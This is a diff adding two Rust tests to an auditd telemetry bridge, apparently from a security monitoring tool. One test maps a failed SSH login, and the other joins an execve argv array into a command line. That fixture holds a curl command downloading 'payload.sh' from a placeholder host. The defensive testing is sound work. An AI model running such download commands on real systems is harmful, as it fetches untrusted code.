@@ -445,4 +445,61 @@ mod tests {
             _ => panic!("expected file_persistence payload"),
         }
     }
+
+    #[tokio::test]
+    async fn execve_argv_array_is_joined_into_command_line() {
+        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
+            "type": "EXECVE",
+            "serial": 500,
+            "timestamp": "2026-04-13T15:21:00Z",
+            "host": "linux-a",
+            "syscall": "execve",
+            "exe": "/usr/bin/curl",
+            "comm": "curl",
+            "parent_comm": "bash",
+            "argv": ["curl", "-fsSL", "https://example.invalid/payload.sh"],
+            "acct": "svc-app"
+        })]));
+
+        let event = bridge
+            .poll()
+            .await
+            .expect("execve with argv array should map")
+            .pop()
+            .expect("one event");
+        match event.payload {
+            TelemetryPayload::ProcessStart(process) => {
+                assert_eq!(
+                    process.command_line,
+                    "curl -fsSL https://example.invalid/payload.sh"
+                );
+            }
+            _ => panic!("expected process_start payload"),
+        }
+    }
+
+    #[tokio::test]
+    async fn auth_success_no_marks_event_failed() {
+        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
+            "type": "USER_LOGIN",
+            "serial": 501,
+            "timestamp": "2026-04-13T15:22:00Z",
+            "host": "linux-a",
+            "acct": "alice",
+            "exe": "/usr/sbin/sshd",
+            "addr": "198.51.100.31",
+            "success": "no"
+        })]));
+
+        let event = bridge
+            .poll()
+            .await
+            .expect("USER_LOGIN should map")
+            .pop()
+            .expect("one event");
+        match event.payload {
+            TelemetryPayload::AuthenticationEvent(auth) => assert!(!auth.success),
+            _ => panic!("expected authentication payload"),
+        }
+    }
 }
